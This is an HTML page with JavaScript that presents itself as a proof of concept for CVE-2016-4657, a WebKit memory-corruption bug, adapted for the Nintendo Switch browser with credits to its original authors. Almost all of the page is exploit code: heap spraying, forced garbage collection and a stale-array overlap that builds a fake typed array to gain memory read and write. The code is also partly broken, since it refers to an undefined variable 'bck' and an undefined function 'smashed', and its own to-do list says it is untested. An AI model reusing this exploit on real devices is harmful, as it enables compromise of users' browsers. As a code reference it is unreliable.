<!--

 Based on the webkit exploit from jbme made by qwertyoruiop. Special thanks to LiveOverflow for his implementation for this exploit.
 He sniped me to the point on a PoC. Dang.
 
 *insert FIRE mixtape lyrics here!*

 This is a PoC for CVE-2016-4657 on the Nintendo Switch. 
 
-->

<!--
  Todo:
    * Remove iOS related values. Fixed thanks to LiveOverflow. Beat me to the punch for a PoC for this switch exploit. *sad doot*
    * Get a goddamn switch.
    * Test the exploit.
    * Make it somewhat useful.
-->

 <html manifest="off.appcache">
 <head>
 <title>--Pegasushaxx--</title>
 <meta name="viewport" content="user-scalable=1.0,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
 <meta name="apple-mobile-web-app-capable" content="no">
 <meta name="format-detection" content="telephone=no">
 <link rel="apple-touch-icon" href="apple-touch-icon.png">
 <meta name="application-name" content="--Pegasushax--"/>
<style>
 body {
 overflow: hidden;
 position: fixed;
 position: relative;
 }
 h1{ 
 overflow: hidden;
 position: fixed;
 position: absolute;
 top: 40%;
 left: 50%;
 transform: translate(-50%, -50%);
 }

footer {
    position: absolute;
    left: 0;
    bottom: 0;
    height: 40px;
    width: 100%;
    overflow:hidden;
}

 </style>
</head>
 <body>
<script>

//setting memory variables
 var mem0 = 0;
 var mem1 = 0;
 var mem2 = 0;

//setting alert to printf for easier access and make it more C like
 var printf = alert;
 var _dview = null;

// "write 2x 32bit in a DataView and get the Float representation of it" - LiveOverflow
 function u2d(low, hi) {
 	if (!_dview) _dview = new DataView(new ArrayBuffer(16));
 	_dview.setUint32(0, hi);
 	_dview.setUint32(4, low);
 	return _dview.getFloat64(0);
 }
	
 var pressure = new Array(100); //pressure array for garbage collection
 var bufs = new Array(10000); //buffer array
 var smsh = new Uint32Array(0x10); //smash array
 var stale = 0; //stale pointer
 
//garbage collection
 dgc = function() { 
 	for (var i = 0; i < pressure.length; i++) {
 		pressure[i] = new Uint32Array(0x10000);
 	}
 	for (var i = 0; i < pressure.length; i++) {
 		pressure[i] = 0;
 	}
 }

 function swag() { //very swag function indeed.
 	if (bufs[0]) return;
 	dgc();
 	dgc();
 	dgc();
 	dgc();
 	dgc();
 	dgc();
 	dgc();
 	dgc();
 	for (i = 0; i < bufs.length; i++) {
 		bufs[i] = new Uint32Array(0x100 * 2)
 		for (k = 0; k < bufs[i].length;) {
 			bufs[i][k++] = 0x41414141;
 			bufs[i][k++] = 0xffff0000;
 		}
 	}
 }
	
 var trycatch = "";
 for (var z = 0; z < 0x2000; z++) trycatch += "try{} catch(e){}; ";
 var fc = new Function(trycatch);
 var fcp = 0;
 var smsh = new Uint32Array(0x10)

 function go() {
 	document.body.innerHTML = "<center><h1>Running in the 90's...</h1>by <a href='https://twitter.com/qwertyoruiopz'>qwertyoruiopz</a> & implementation by <a href='https://www.twitter.com/Crims0nKaede'>CrimsonMaple</a>, for Nintendo Switch. <br />This may take multiple tries.<br />tyvm NSO, sick webkit exploit (at the time)</center>";
	dgc();
 	setTimeout(go_, 400);
 }

 function go_() {
 	if (smsh.length != 0x10) return;
 	dgc();
 	var arr = new Array(0x100);
 	var yolo = new ArrayBuffer(0x1000);
 	arr[0] = yolo;
 	arr[1] = 0x13371337; //we got some 1337 h@\/ here bois
	// 					  /\
 	var not_number = {};
 	not_number.toString = function() {
 		arr = null;
 		props["stale"]["value"] = null;
 		swag();
 		if (bufs[0]) return 10; // if bufs is already overlapping memory, bail out.
		for (var i = 0; i < 20; i++) { dgc(); } //I like oneliners. Get over it.
		for (i = 0; i < bufs.length; i++) {
			bufs[i] = new Uint32Array(0x100 * 2)
				for (k = 0; k < bufs[i].length;) {
					bufs[i][k++] = 0x41414141;
					bufs[i][k++] = 0xffff0000;
				}
		}
		return 10;
 	};
	//setting array with properties.
 	var props = {
 		p0: {value: 0},
		
 		p1: {value: 1},
		
 		p2: {value: 2},
		
 		p3: {value: 3},
		
 		p4: {value: 4},
		
 		p5: {value: 5},
		
 		p6: {value: 6},
		
 		p7: {value: 7},
		
 		p8: {value: 8},
		
 		length: {value: not_number},
		
 		stale: {value: arr},
		
 		after: {value: 666}
 	};
 	var target = [];
 	var stale = 0;
 	var before_len = arr.length;
 	Object.defineProperties(target, props);
 	stale = target.stale;
 	stale[0] += 0x101;
 	stale[1] = {}
 	for (var z = 0; z < 0x1000; z++) fc();
 	for (i = 0; i < bufs.length; i++) {
 		for (k = 0; k < bufs[0].length; k++) {
 			if (bufs[i][k] == 0x41414242) {
				printf("Overlapping arrays at pointers" +['i']+['k']);
 				fcp = bufs[i][k];
 				stale[0] = {
 					'a': u2d(105, 0x1172600),
 					'b': u2d(0, 0),
 					'c': smsh,
 					'd': u2d(0x100, 0)
 				}
				printf('created the JavaScript Object at' + stale[0]);
 				stale[1] = stale[0]
 				bufs[i][k] += 0x10; // misalign so we end up in JSObject's properties, which have a crafted Uint32Array pointing to smsh
 				stale[0][6] = 0x1337;
 				mem0 = stale[0];
 				mem1 = bck;
 				mem2 = smsh;
 				bufs.push(stale)
 				if (smsh.length != 0x10) {
 					smashed(stale[0]);
 				}
 				return;
 			}
 		}
 	}
 	document.location.reload();
 }

 </script>



<center><a href="javascript:go()"><h1>go</h1></a>by <a href='https://twitter.com/qwertyoruiopz'>qwertyoruiopz</a> & & implementation by <a href='https://www.twitter.com/Crims0nKaede'>CrimsonMaple</a>, for Nintendo Switch. <br />This may take multiple tries.<br />tyvm NSO, sick webkit exploit (at the time)</center>
	 <center><a>how does one html?</a></center>
<footer><center><a>Thanks to qwertyoruiop and pangu team for this exploit, and their great work on the iOS and Switch hacking scene (only qwerty). #respect!</a></center></footer> 
</body>
</html>
